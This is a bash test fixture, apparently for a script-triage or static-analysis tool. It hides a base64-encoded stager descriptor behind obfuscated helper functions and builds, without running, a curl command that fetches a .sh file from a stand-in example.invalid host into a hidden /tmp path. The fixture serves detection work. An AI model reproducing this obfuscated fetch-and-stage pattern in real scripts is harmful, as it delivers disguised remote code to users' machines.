# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_b5ccef52='dj0xfHN0ZXBzPWFjcXVpcmVfcmVtb3RlLHdyaXRlX2ZpbGV8YWRhcHRlcj1jdXJsX291dHB1dHxzdG''FnZV9jb3VudD0xfGNhbXBhaWduX2lkPWNhbXBhaWduLTQ0MjY3Nzk4ZTF8dXJsPWh0dHBzOi8vNDQy''Njc3OThlMS5leGFtcGxlLmludmFsaWQvYjg3YjA3Y2Muc2h8dXNlcl9hZ2VudD1IdW50cmVzc0xhYi''80NDI2Nzc5OGUxfGZpbGVfcGF0aD0vdG1wL2h1bnRyZXNzLWNhY2hlLy5zdGFnZS00NDI2Nzc5OGUx'
readonly Codec_b5ccef52='base64_chunks|identity|'

Load_b5ccef52() {
  EnCoDeD_Bytes=()
  local PaRt
  while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_b5ccef52}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_b5ccef52() {
  DeCoDeD_Bytes=()
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes+=("${EnCoDeD_Bytes[InDeX]}")
  done
}

Recover_b5ccef52() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  local -a compass=(north south); NeUtRaL="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_b5ccef52
  if ! Decode_b5ccef52; then return 71; fi
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_b5ccef52() { local recovered field; local -a fields; recovered="$(Recover_b5ccef52)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_b5ccef52() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_b5ccef52)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_b5ccef52; fi

# reconstruction complete